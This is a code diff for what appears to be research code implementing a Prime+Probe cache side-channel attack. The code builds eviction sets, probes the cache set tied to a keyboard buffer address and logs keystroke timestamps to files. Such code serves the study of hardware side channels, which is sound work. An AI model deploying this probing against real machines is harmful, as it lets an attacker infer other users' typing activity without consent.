@@ -174,7 +174,7 @@ uint64_t measure_keystroke(int threshold) {
   int slice = get_i7_2600_slice(KBD_KEYCODE_ADDR);
   int eslist_index = get_evset_index(slice);
   uint8_t probemap[1024 * 1024];
-  uint64_t keystrokes[64 * 64 + 1];
+  uint64_t keystrokes[64 * 64];
 
   uint64_t num_keystrokes = 0;
   uint64_t start_time = __rdtscp(&core_id);
@@ -191,6 +191,37 @@ uint64_t measure_keystroke(int threshold) {
   return start_time;
 }
 
+void measure_keystroke_without_slice(int threshold) {
+  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
+  uint8_t probemap[4][1024 * 1024];
+  uint64_t keystrokes[4][64 * 64];
+  uint64_t total_strokes[4];
+
+  char filename[20];
+  uint64_t start_time = __rdtscp(&core_id);
+  for (int i = 0; i < 4; i++) {
+    total_strokes[i] = 0;
+    sprintf(filename, "pp_keystrokes_%d.bin", i);
+    flush_timestamps(&start_time, 1, filename);
+  }
+
+  printf("please start typing\n");
+  for (int i = 0; i < 3; i++) {
+    uint64_t *num_strokes = prime_probe_many_sets(
+        es_list, EVERGLADES_NUM_SLICES, EVERGLADES_ASSOCIATIVITY, 1024 * 1024,
+        probemap, 64 * 64, keystrokes, threshold);
+    for (int j = 0; j < 4; j++) {
+      sprintf(filename, "pp_keystrokes_%d.bin", j);
+      flush_timestamps(keystrokes[j], num_strokes[j], filename);
+      total_strokes[j] += num_strokes[j];
+    }
+    free(num_strokes);
+  }
+  for (int i = 0; i < 4; i++) {
+    printf("%lu\n", total_strokes[i]);
+  }
+}
+
 int main() {
   // test_eviction_set();
   // test_covert_channel();
@@ -204,6 +235,8 @@ int main() {
   // read_binary("output0.bin", slice_zero_times, timestamp_sizes[0]);
   // free(timestamp_sizes);
   es_list = get_all_slices_eviction_sets(mapping_start, 428);
-  measure_keystroke(threshold_from_flush(mapping_start));
+  measure_keystroke_without_slice(threshold_from_flush(mapping_start));
+  free_es_list(es_list);
+  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
   return 0;
 }
